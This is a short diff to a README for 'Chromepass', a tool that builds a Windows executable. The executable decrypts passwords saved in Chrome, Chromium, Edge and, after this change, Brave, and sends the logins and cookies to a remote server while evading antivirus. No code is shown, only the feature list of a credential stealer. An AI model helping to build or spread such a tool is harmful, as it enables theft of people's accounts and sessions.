@@ -53,7 +53,7 @@
 ## About The project
 Chromepass is a python-based console application that generates a windows executable with the following features:
 
-  - Decrypt Google Chrome, Chromium and Edge saved paswords
+  - Decrypt Google Chrome, Chromium, Edge and Brave saved paswords
   - Send a file with the login/password combinations and cookies remotely (http server)
   - Undetectable by AV if done correctly
   - Custom icon
